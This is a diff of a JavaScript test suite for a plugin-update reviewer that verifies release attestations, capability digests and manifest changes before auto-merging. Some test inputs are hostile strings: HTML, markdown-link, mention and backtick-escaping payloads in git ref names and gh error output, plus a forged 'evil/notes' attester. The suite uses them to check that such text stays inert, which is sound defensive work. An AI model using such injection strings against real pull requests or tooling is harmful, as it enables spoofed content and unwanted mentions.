-    ["only the capability lines changed", base, pinned, release("0.1.1").replace('files = "read"', "files = 'read'"), VERIFIED, /^its capability lines changed$/],
-    ["a privileged release's lines changed", priv, pinnedPriv, privSame.replace('name = "pandoc"', "name = 'pandoc'"), VERIFIED, /^its capability lines changed$/],
+    ["only the manifest beyond the digest changed", priv, pinnedPriv, privileged("0.1.1", '\nversion = ["-x"]'), VERIFIED, /^its manifest changes more than its words$/],
     ["privileged, not attested", priv, pinnedPriv, privSame, await prov({}), /privileged and its provenance did not verify: no attestation/],
     ["privileged, gh missing", priv, pinnedPriv, privSame, unverified("gh is not installed"), /gh is not installed/],
     ["privileged, never checked", priv, pinnedPriv, privSame, null, /did not verify: not checked/],
-    ["privileged, on main from another commit", priv, pinnedPriv, privSame, await prov({ "refs/heads/main": ghResult({ sha, ref: "refs/heads/main", commit: OTHER_COMMIT }) }), /another commit than the tag's/],
-    ["privileged, at the tag from another commit", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghResult({ sha, commit: OTHER_COMMIT }) }), /another commit than the tag's/],
-    ["privileged, signed on another branch", priv, pinnedPriv, privSame, await prov({ "refs/heads/main": ghResult({ sha, san: "https://github.com/o/notes/.github/workflows/release.yml@refs/heads/feature", ref: "refs/heads/main" }) }), /another ref \(refs\/heads\/feature\)/],
-    ["privileged, the tag doesn't resolve", priv, pinnedPriv, privSame, await verifyProvenance(bytes, "o/notes", "v0.1.1", { run: fakeGh({}).run, getJson: async () => ({ object: { type: "tree", sha: TAGGED } }) }), /the tag's commit is unknown/],
-    ["privileged, attested by another repository", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ repo: "evil/notes" }), id, "e".repeat(64), "refs/tags/v0.1.1"), /another repository/],
-    ["privileged, attested by another workflow", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ workflow: ".github/workflows/ci.yml" }), id, "e".repeat(64), "refs/tags/v0.1.1"), /another workflow/],
-    ["privileged, attested at another ref", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ ref: "refs/heads/main2" }), id, "e".repeat(64), "refs/tags/v0.1.1"), /another ref/],
-    ["privileged, attested over other bytes", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ sha: "0".repeat(64) }), id, "e".repeat(64), "refs/tags/v0.1.1"), /other bytes/],
+    ["privileged, on main from another commit", priv, pinnedPriv, privSame, await prov({ "refs/heads/main": ghFor({ ref: "refs/heads/main", commit: OTHER_COMMIT }) }), /another commit than the tag's/],
+    ["privileged, at the tag from another commit", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghFor({ commit: OTHER_COMMIT }) }), /another commit than the tag's/],
+    ["privileged, signed on another branch", priv, pinnedPriv, privSame, await prov({ "refs/heads/main": ghFor({ san: "https://github.com/o/notes/.github/workflows/release.yml@refs/heads/feature", ref: "refs/heads/main" }) }), /another ref \(refs\/heads\/feature\)/],
+    ["privileged, the tag doesn't resolve", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghFor() }, { getJson: apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "tree", sha: TAGGED } } }) }), /the tag's commit is unknown/],
+    ["privileged, the tag is on a side commit", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghFor() }, { getJson: githubFor(TAGGED, { status: "diverged", merge_base_commit: { sha: OTHER_COMMIT } }) }), /not on main/],
+    ["privileged, plugin.toml swapped", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghResult({ subjects: [sha(WASM_BYTES), "9".repeat(64)] }) }), /no attestation covers this plugin\.toml/],
+    ["privileged, wasm and toml from two runs", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": JSON.stringify([attestation({ subjects: [sha(WASM_BYTES)] }), attestation({ subjects: [sha(TOML_BYTES)] })]) }), /no attestation covers this plugin\.toml/],
+    ["privileged, attested by another repository", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ repo: "evil/notes" }), ID, DIGESTS, "refs/tags/v0.1.1"), /another repository/],
+    ["privileged, attested by another workflow", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ workflow: ".github/workflows/ci.yml" }), ID, DIGESTS, "refs/tags/v0.1.1"), /another workflow/],
+    ["privileged, attested at another ref", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ ref: "refs/heads/main2" }), ID, DIGESTS, "refs/tags/v0.1.1"), /another ref/],
+    ["privileged, attested over other bytes", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ subjects: ["0".repeat(64), TOML] }), ID, DIGESTS, "refs/tags/v0.1.1"), /other bytes/],
   ];
   for (const [what, entry, p, r, provenance, reason] of cases) {
     const got = review(entry, p, r, provenance);
@@ -676,22 +828,71 @@ test("each auto-merge condition, false in turn, holds the bump for a person", as
   const bump = { ...bumpOf(pinnedPriv, privSame), provenance: onMain, ...review(priv, pinnedPriv, privSame, onMain) };
   assert.match(
     pullRequest([bump]).body,
-    /- Provenance: verified — `plugin.wasm` is attested by `o\/notes`'s `\.github\/workflows\/release\.yml`, signed at `refs\/heads\/main`, built from commit `1{40}` \(the tag's\)\./,
+    /- Provenance: verified — one attestation covers `plugin\.wasm` and `plugin\.toml`, by `o\/notes`'s `\.github\/workflows\/release\.yml`, signed at `refs\/heads\/main`, built from commit `1{40}` \(the tag's, on main\)\./,
   );
-  const waits = { ...bumpOf(pinnedPriv, privSame), provenance: await prov({}), ...review(priv, pinnedPriv, privSame, await prov({})) };
+  const none = await prov({});
+  const waits = { ...bumpOf(pinnedPriv, privSame), provenance: none, ...review(priv, pinnedPriv, privSame, none) };
   assert.match(
     pullRequest([waits]).body,
-    /- Provenance: \*\*not verified\*\* \(` no attestation `\); expected an attestation of `plugin\.wasm` by `o\/notes`'s `\.github\/workflows\/release\.yml` at `refs\/tags\/v0\.1\.1` or `refs\/heads\/main`, built from commit `1{40}`\./,
+    /- Provenance: \*\*not verified\*\* \(` no attestation `\); expected one attestation of `plugin\.wasm` and `plugin\.toml` by `o\/notes`'s `\.github\/workflows\/release\.yml` at `refs\/tags\/v0\.1\.1` or `refs\/heads\/main`, built from commit `1{40}`, which must be on main\./,
   );
 });
 
-test("over every pair of parity-fixture manifests, auto-merge only with the same tier, equal digests, and provenance when privileged", () => {
+test("a reason from an attestation or gh is inert in the PR body", async () => {
+  const pinnedPriv = privileged("0.1.0");
+  const priv = entryOf(pinnedPriv);
+  const privSame = privileged("0.1.1");
+  for (const ref of ["refs/heads/www.evil.example", "refs/heads/<b>x</b>", "refs/heads/`x`` ``y", "refs/heads/@someone [l](https://e.vil)"]) {
+    const p = await verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes", "v0.1.1", {
+      run: fakeGh({ "refs/tags/v0.1.1": ghFor({ san: `https://github.com/o/notes/.github/workflows/release.yml@${ref}` }) }).run,
+      getJson: githubFor(TAGGED),
+      env: {},
+    });
+    const b = { ...bumpOf(pinnedPriv, privSame), provenance: p, ...review(priv, pinnedPriv, privSame, p) };
+    const { body } = pullRequest([b]);
+    if (!ref.includes("@")) assert.ok(b.why.includes(ref), "the hostile ref is in the reason");
+    // Everything taken from the attestation sits inside one code span, fenced
+    // past any backticks it holds, on a line of its own.
+    const reason = body.split("\n").filter((l) => l.startsWith("- `notes` 0.1.1: `"));
+    assert.deepEqual(reason, [`- \`notes\` 0.1.1: ${code(b.why)}`], ref);
+    const provenance = body.split("\n").filter((l) => l.startsWith("- Provenance:"));
+    assert.equal(provenance.length, 1, ref);
+    assert.ok(provenance[0].startsWith(`- Provenance: **not verified** (${code(p.why)}); expected`), `${ref}: ${provenance[0]}`);
+    const fence = code(b.why).match(/^`+/)[0];
+    assert.ok(!b.why.includes(fence), "no run of backticks in the reason closes its span");
+  }
+  // gh's own first stderr line, too.
+  const p = await verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes", "v0.1.1", {
+    run: async () => {
+      throw Object.assign(new Error("exit 1"), { stderr: "<img src=x> @someone www.evil.example\nnext" });
+    },
+    getJson: githubFor(TAGGED),
+    env: {},
+  });
+  const { body } = pullRequest([{ ...bumpOf(pinnedPriv, privSame), provenance: p, ...review(priv, pinnedPriv, privSame, p) }]);
+  const why = review(priv, pinnedPriv, privSame, p).why;
+  assert.match(why, /<img src=x> @someone www\.evil\.example$/);
+  assert.ok(body.split("\n").includes(`- \`notes\` 0.1.1: ${code(why)}`));
+  assert.ok(!why.includes("next"), "only gh's first line");
+});
+
+test("over every pair of parity-fixture manifests, auto-merge only with the same tier, equal digests, the same manifest but its words, and provenance when privileged", () => {
   const fixture = JSON.parse(readFileSync(new URL("../../web-ui/src/lib/net/fixtures/wire/plugin-caps.json", import.meta.url), "utf8"));
   const manifests = fixture.cases.map((c) => c.frame.manifest);
+  // Each manifest also with a setup step, version args, bin or unpack
+  // changed where it has them, and with only its words changed.
+  const variants = (m) => [
+    m,
+    m.replace(/version = "1\.2\.3"/, 'version = "1.2.4"').replace(/summary = "A demo\."/, 'summary = "Other words."'),
+    m.replace(/args = \["--version"\]/, 'args = ["--evil"]'),
+    m.replace(/version = \["--version"\]/, 'version = ["--evil"]'),
+    m.replace(/bin = "typst-linux"/, 'bin = "other"'),
+    m.replace(/unpack = "zip"/, 'unpack = "none"'),
+  ];
   let merged = 0;
   for (const p of manifests) {
     const before = describeManifest(p);
-    for (const r of manifests) {
+    for (const r of [...new Set(manifests.flatMap(variants))]) {
       const after = describeManifest(r);
       for (const tier of ["sandboxed", "privileged"]) {
         for (const provenance of [VERIFIED, unverified("no attestation"), null]) {
@@ -701,19 +902,24 @@ test("over every pair of parity-fixture manifests, auto-merge only with the same
           assert.equal(tier, before.tier, "the lock's tier is the pinned release's");
           assert.equal(after.tier, before.tier, "the same tier");
           assert.equal(after.caps, before.caps, "equal digests");
+          assert.equal(manifestBehaviour(r), manifestBehaviour(p), "the same manifest but its words");
           if (tier === "privileged") assert.equal(provenance?.verified, true, "privileged needs provenance");
         }
       }
     }
     // An unchanged release merges by itself: sandboxed always, privileged
-    // only attested.
+    // only attested; one that changes only its words too.
     const entry = { id: "demo", tier: before.tier, caps: before.caps };
-    assert.equal(review(entry, p, p, VERIFIED).automerge, true);
-    assert.equal(review(entry, p, p, unverified("no attestation")).automerge, before.tier === "sandboxed");
+    for (const r of [p, variants(p)[1]]) {
+      assert.equal(review(entry, p, r, VERIFIED).automerge, true);
+      assert.equal(review(entry, p, r, unverified("no attestation")).automerge, before.tier === "sandboxed");
+    }
+    for (const r of variants(p).slice(2).filter((v) => v !== p)) {
+      assert.equal(review(entry, p, r, VERIFIED).automerge, false, "a changed setup step, version arg, bin or unpack waits");
+    }
   }
   assert.ok(merged > 0);
 });
-
 
 test("a bump whose capabilities are unchanged says so in one line, and keeps tier and caps", () => {
   const pinned = release("0.1.0");
@@ -734,7 +940,7 @@ test("a bump that adds a tool waits, carries the new caps, and says what it adds
   const next = release("0.2.0").replace('mcp_tools = ["notes_read"]', 'mcp_tools = ["notes_read", "notes_write"]');
   const bump = bumpOf(pinned, next);
   assert.equal(bump.automerge, false);
-  assert.equal(bump.why, "its capability digest is not the approved one: it may ask for more; its capability lines changed");
+  assert.equal(bump.why, "its capability digest is not the approved one: it may ask for more; its manifest changes more than its words");
   assert.equal(bump.tier, "sandboxed");
   assert.equal(bump.caps, describeManifest(next).caps);
   assert.notEqual(bump.caps, bump.from_caps);
